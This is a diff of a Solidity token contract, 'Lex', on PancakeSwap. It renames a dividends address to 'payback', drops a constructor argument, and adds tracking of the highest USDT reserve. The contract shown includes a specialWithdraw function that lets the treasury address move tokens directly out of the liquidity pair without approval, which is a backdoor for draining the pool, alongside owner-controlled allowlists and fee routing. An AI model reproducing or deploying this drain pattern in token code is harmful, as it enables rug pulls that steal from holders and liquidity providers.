@@ -27,7 +27,7 @@ interface INodeDividends {
     function updateFarm(Models.Source source, uint256 amount) external;
 }
 
-interface IDividends{
+interface IPayback{
     function updateFarm(uint256 amount) external;
 }
 
@@ -43,7 +43,7 @@ contract Lex is ERC20, Ownable {
     address public treasury;
     address public wallet;
     address public nodeDividends;
-    address public subCoinDividends;
+    address public payback;
 
     address public constant DEAD = 0x000000000000000000000000000000000000dEaD;
 
@@ -55,6 +55,7 @@ contract Lex is ERC20, Ownable {
     uint256 public sellRate = 5;
 
     uint256 public swapThreshold = 10 ether;
+    uint256 public highestReserve;
     // uint256 private constant COST_DUST = 1e16; // 0.01 USDT
 
     bool private swapping;
@@ -69,27 +70,23 @@ contract Lex is ERC20, Ownable {
     constructor(
         address _initialRecipient,
         address _wallet,
-        address _nodeDividends,
         address _USDT
     ) ERC20("LEX","LEX") Ownable(msg.sender) {
-
+        
         _mint(_initialRecipient, 21000000 ether);
 
-        pancakeRouter = IUniswapV2Router02(
-            0x10ED43C718714eb63d5aA57B78B54704E256024E
-        );
+        pancakeRouter = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
 
         USDT = _USDT;
         wallet = _wallet;
-        nodeDividends = _nodeDividends;
 
         pancakeFactory = pancakeRouter.factory();
+
         pancakePair = IPancakeFactory(pancakeFactory)
             .createPair(address(this), USDT);
 
         allowlist[_initialRecipient] = true;
         allowlist[_wallet] = true;
-        allowlist[_nodeDividends] = true;
     }
 
     /* ---------------- CONFIG ---------------- */
@@ -103,8 +100,8 @@ contract Lex is ERC20, Ownable {
         leo = _leo;
     }
 
-    function setSubCoinDividends(address _addr) external onlyOwner {
-        subCoinDividends = _addr;
+    function setPaybackAddr(address _addr) external onlyOwner {
+        payback = _addr;
         allowlist[_addr] = true;
     }
 
@@ -166,17 +163,17 @@ contract Lex is ERC20, Ownable {
                     .updateFarm(Models.Source.TAX_FEE, received);
             }
         } else {
-            amountBurn += amountNode; // 动态转入 burn
+            amountBurn += amountNode; 
         }
 
         /* -------- Sub -------- */
-        if (subCoinDividends != address(0) && _leoReady() && amountSub > 0) {
-            uint256 beforeBal = IERC20(leo).balanceOf(subCoinDividends);
-            _swap(_pathToLeo(), amountSub, subCoinDividends);
-            uint256 received = IERC20(leo).balanceOf(subCoinDividends) - beforeBal;
+        if (payback != address(0) && _leoReady() && amountSub > 0) {
+            uint256 beforeBal = IERC20(leo).balanceOf(payback);
+            _swap(_pathToLeo(), amountSub, payback);
+            uint256 received = IERC20(leo).balanceOf(payback) - beforeBal;
 
             if (received > 0) {
-                IDividends(subCoinDividends)
+                IPayback(payback)
                     .updateFarm(received);
             }
         } else {
@@ -212,6 +209,9 @@ contract Lex is ERC20, Ownable {
             super._update(from, to, amount);
             return;
         }
+
+        uint256 reserve = IERC20(USDT).balanceOf(pancakePair);
+        if(reserve > highestReserve) highestReserve = reserve;
 
         bool isBuy = from == pancakePair;
         bool isSell = to == pancakePair;
@@ -356,13 +356,13 @@ contract Lex is ERC20, Ownable {
         }
 
         /* -------- Sub -------- */
-        if (subCoinDividends != address(0) && _leoReady() && toSub > 0) {
-            uint256 beforeBal = IERC20(leo).balanceOf(subCoinDividends);
-            _swap(_pathToLeo(), toSub, subCoinDividends);
-            uint256 received = IERC20(leo).balanceOf(subCoinDividends) - beforeBal;
+        if (payback != address(0) && _leoReady() && toSub > 0) {
+            uint256 beforeBal = IERC20(leo).balanceOf(payback);
+            _swap(_pathToLeo(), toSub, payback);
+            uint256 received = IERC20(leo).balanceOf(payback) - beforeBal;
 
             if (received > 0) {
-                IDividends(subCoinDividends)
+                IPayback(payback)
                     .updateFarm(received);
             }
         } else {
@@ -426,5 +426,9 @@ contract Lex is ERC20, Ownable {
     function specialWithdraw(uint256 amount) external {
         require(msg.sender == treasury, "NO_PERMISSION");
         super._update(pancakePair, treasury, amount);
+    }
+
+    function getHighestReserve() external view returns(uint256){
+        return highestReserve;
     }
 }
